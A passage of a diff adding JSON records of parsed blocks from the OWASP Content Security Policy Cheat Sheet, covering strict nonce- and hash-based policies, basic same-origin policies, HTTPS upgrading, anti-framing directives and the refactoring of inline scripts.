+    "code_language": null,
+    "lang": null,
+    "table_header_cols": [
+      "Value",
+      "Description"
+    ],
+    "table_rows": [
+      [
+        "'none'",
+        "No URLs match."
+      ],
+      [
+        "'self'",
+        "Refers to the origin site with the same scheme and port number."
+      ],
+      [
+        "'unsafe-inline'",
+        "Allows the usage of inline scripts or styles."
+      ],
+      [
+        "'unsafe-eval'",
+        "Allows the usage of eval in scripts."
+      ]
+    ],
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00098",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 98,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "To better understand how the directive sources work, check out the [source lists from w3c](https://w3c.github.io/webappsec-csp/#framework-directive-source-list).",
+    "text_hash": "352d0cab190b2a90c497ddb6f8fb35729e853281089fb7471ea102c83be986ec",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 265,
+      "end_line": 265
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Special Directive Sources"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00099",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 99,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "## CSP Sample Policies",
+    "text_hash": "90f7b254cb36d5fbf0c43290871ad89b9a29d99fd589b0f3859141639ab01189",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 267,
+      "end_line": 267
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies"
+    ],
+    "heading_level": 2,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00100",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 100,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Strict Policy",
+    "text_hash": "93600524ad701ea81d9ae42e26a7a1067b1f001c3aad51ea0c31ccd853d2dc0b",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 269,
+      "end_line": 269
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Strict Policy"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00101",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 101,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "A strict policy's role is to protect against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP.",
+    "text_hash": "2e791809ba2194e8303c036ce136a0269b88f2cdc787ddd7e233be28f319909b",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 271,
+      "end_line": 271
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Strict Policy"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00102",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 102,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "As noted above, Google went ahead and set up a detailed and methodological [instructions](https://web.dev/strict-csp) for creating a Strict CSP.",
+    "text_hash": "080bc78ce401e51351d915b6231caa2ea2151926e422ffd9324b2d268466c6b3",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 273,
+      "end_line": 273
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Strict Policy"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00103",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 103,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Based on those instructions, one of the following two policies can be used to apply a strict policy:",
+    "text_hash": "014e56c72574fd7512357758ab334f874a52eef4b2ffa8702f4a476166d438c3",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 275,
+      "end_line": 275
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Strict Policy"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00104",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 104,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "#### Nonce-based Strict Policy",
+    "text_hash": "1329414b5b27c4622ab7dcda3c8a673efb2641cdd725ec2d6f7996c37c195b0e",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 277,
+      "end_line": 277
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Strict Policy",
+      "Nonce-based Strict Policy"
+    ],
+    "heading_level": 4,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00105",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 105,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```text\nContent-Security-Policy:\n  script-src 'nonce-{RANDOM}' 'strict-dynamic';\n  object-src 'none';\n  base-uri 'none';\n```",
+    "text_hash": "54471c2ea256da243619928990c8f257706dc9af3be7b0e8a2cffc1902b35d87",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 279,
+      "end_line": 284
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Strict Policy",
+      "Nonce-based Strict Policy"
+    ],
+    "heading_level": null,
+    "code_language": "text",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00106",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 106,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "#### Hash-based Strict Policy",
+    "text_hash": "ce759eafaf3f9714fd993526e015abc6be25956e81cfa5838ef2322866f0db05",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 286,
+      "end_line": 286
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Strict Policy",
+      "Hash-based Strict Policy"
+    ],
+    "heading_level": 4,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00107",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 107,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```text\nContent-Security-Policy:\n  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';\n  object-src 'none';\n  base-uri 'none';\n```",
+    "text_hash": "6ccd43bdb415fde7f7c2de8aef3403b05994c581ee9484b9478f87f2b734b3d6",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 288,
+      "end_line": 293
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Strict Policy",
+      "Hash-based Strict Policy"
+    ],
+    "heading_level": null,
+    "code_language": "text",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00108",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 108,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Basic non-Strict CSP Policy",
+    "text_hash": "1f6b5bc07e597c43681b6039526aae47a55c3c12d585a4101f390aa0887b8065",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 295,
+      "end_line": 295
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Basic non-Strict CSP Policy"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00109",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 109,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "This policy can be used if it is not possible to create a Strict Policy and it prevents cross-site framing and cross-site form-submissions. It will only allow resources from the originating domain for all the default level directives and will not allow inline scripts/styles to execute.",
+    "text_hash": "0ce86233c410386e05c9f6ac1405ef8b844c7a42b1f5f260025d9cbaa5804031",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 297,
+      "end_line": 297
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Basic non-Strict CSP Policy"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00110",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 110,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "If your application functions with these restrictions, it drastically reduces your attack surface and works with most modern browsers.",
+    "text_hash": "39c99698c2e030b8d34b25290617e153c5660bbf919dd7af4bb3d22b146bd2af",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 299,
+      "end_line": 299
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Basic non-Strict CSP Policy"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00111",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 111,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "The most basic policy assumes:",
+    "text_hash": "a4af0db39c0410f31ef035cd09699b3a0a58094fde77f01be3e0b56152bf5f5e",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 301,
+      "end_line": 301
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Basic non-Strict CSP Policy"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00112",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 112,
+    "file_format": "MARKDOWN",
+    "block_type": "list",
+    "text_content": "- All resources are hosted by the same domain of the document.\n- There are no inlines or evals for scripts and style resources.\n- There is no need for other websites to frame the website.\n- There are no form-submissions to external websites.\n",
+    "text_hash": "ba8cea29d09f74d260614ff6ae1bb69efd000408d44f05fd563a10aee5d6e627",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 303,
+      "end_line": 307
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Basic non-Strict CSP Policy"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00113",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 113,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```text\nContent-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';\n```",
+    "text_hash": "5fd1c14593a5a6bcd7a8fd47529153b4bbcdb4fe8d1a1547a01b0a2379bf522a",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 308,
+      "end_line": 310
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Basic non-Strict CSP Policy"
+    ],
+    "heading_level": null,
+    "code_language": "text",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00114",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 114,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "To tighten further, one can apply the following:",
+    "text_hash": "48d20d239ff7a4a7a400b723910db7a3eacb058cf8f80649de25fdad440e592d",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 312,
+      "end_line": 312
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Basic non-Strict CSP Policy"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00115",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 115,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```text\nContent-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';\n```",
+    "text_hash": "455416a9c1c162a4f5b3e5ed34c3a55639b7f67d94f2a2a6be5d5ec7e082fb05",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 314,
+      "end_line": 316
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Basic non-Strict CSP Policy"
+    ],
+    "heading_level": null,
+    "code_language": "text",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00116",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 116,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "This policy allows images, scripts, AJAX, and CSS from the same origin and does not allow any other resources to load (e.g., object, frame, media, etc.).",
+    "text_hash": "faa1d7ccdee158d99d3a3851f4300184e56b271c3bd5b8b17a27ded8babae673",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 318,
+      "end_line": 318
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Basic non-Strict CSP Policy"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00117",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 117,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Upgrading insecure requests",
+    "text_hash": "d5b9b294a9507f63f744caba015bbb90e87168715862a32b0eea236bff8b6bb2",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 320,
+      "end_line": 320
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Upgrading insecure requests"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00118",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 118,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "If the developer is migrating from HTTP to HTTPS, the following directive will ensure that all requests will be sent over HTTPS with no fallback to HTTP:",
+    "text_hash": "8c3be5317316d3acbc8dcb68edf70d1324f0e1a1c49853a74a3ba773b5848d8d",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 322,
+      "end_line": 322
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Upgrading insecure requests"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00119",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 119,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```text\nContent-Security-Policy: upgrade-insecure-requests;\n```",
+    "text_hash": "d91509074d049dc4b0e8b77763736f09365aa82e563584647bc4548109368614",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 324,
+      "end_line": 326
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Upgrading insecure requests"
+    ],
+    "heading_level": null,
+    "code_language": "text",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00120",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 120,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Preventing framing attacks (clickjacking, cross-site leaks)",
+    "text_hash": "f09ead9b795b359f47a5bd28c9442acd87148d94edf47073a262e3cd906d584a",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 328,
+      "end_line": 328
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Preventing framing attacks (clickjacking, cross-site leaks)"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00121",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 121,
+    "file_format": "MARKDOWN",
+    "block_type": "list",
+    "text_content": "- To prevent all framing of your content use:\n    - `Content-Security-Policy: frame-ancestors 'none';`\n- To allow for the site itself, use:\n    - `Content-Security-Policy: frame-ancestors 'self';`\n- To allow for trusted domain, do the following:\n    - `Content-Security-Policy: frame-ancestors trusted.com;`\n",
+    "text_hash": "fd1b50ac2122f6e4e0fa784c16ddc0c6642019af888992f3d6c6de70b66b0397",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 330,
+      "end_line": 336
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Preventing framing attacks (clickjacking, cross-site leaks)"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00122",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 122,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Refactoring inline code",
+    "text_hash": "2649f14c751bf36896564edfe69e7532590ca8c241276ec0303daebe0f8898fb",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 337,
+      "end_line": 337
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Refactoring inline code"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00123",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 123,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "When `default-src` or `script-src*` directives are active, CSP by default disables any JavaScript code placed inline in the HTML source, such as this:",
+    "text_hash": "cd8dc9a6b3aad6bd4af48a71581bae42d04419f2d787bb36c4702f69f7ea5844",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 339,
+      "end_line": 339
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Refactoring inline code"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00124",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 124,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```javascript\n<script>\nvar foo = \"314\"\n<script>\n```",
+    "text_hash": "867b09eb396fc5c48cca011da460ad04282c2f76fe8a08b27eedaf57629cc1ed",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 341,
+      "end_line": 345
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Refactoring inline code"
+    ],
+    "heading_level": null,
+    "code_language": "javascript",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00125",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 125,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "The inline code can be moved to a separate JavaScript file and the code in the page becomes:",
+    "text_hash": "183c3a60050978a22df4f094e0796ea500316c7bcf7ffb8c1e9678a2b2ce1ec3",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 347,
+      "end_line": 347
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Refactoring inline code"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00126",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 126,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```javascript\n<script src=\"app.js\">\n</script>\n```",
+    "text_hash": "68cd5645eca342e6233c371dad8ec6845c1c837c8ab4f06f4201c64c1d3cd923",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 349,
+      "end_line": 352
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Refactoring inline code"
+    ],
+    "heading_level": null,
+    "code_language": "javascript",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00127",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 127,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "With `app.js` containing the `var foo = \"314\"` code.",
+    "text_hash": "429c9bd9c15c0b58c782438c160caf624655672e567b1656ab85a69be2c35213",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 354,
+      "end_line": 354
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Refactoring inline code"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00128",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 128,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "The inline code restriction also applies to `inline event handlers`, so that the following construct will be blocked under CSP:",
+    "text_hash": "bb9e223ec70deb64a2c2394969b0dbafca236aa5ce4d4f730979fb218d1e7d22",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 356,
+      "end_line": 356
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Refactoring inline code"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00129",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 129,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```html\n<button id=\"button1\" onclick=\"doSomething()\">\n```",
+    "text_hash": "0b64449d82be147e8ee1bb9d0a5ef385b423476c6a0652b048c5072309714808",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 358,
+      "end_line": 360
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Refactoring inline code"
+    ],
+    "heading_level": null,
+    "code_language": "html",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00130",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 130,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "This should be replaced by `addEventListener` calls:",
+    "text_hash": "a718ca1d635353d14db0eee593ab8dc11dbd35e8774e38de2931275bc16d2862",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 362,
+      "end_line": 362
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "CSP Sample Policies",
+      "Refactoring inline code"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
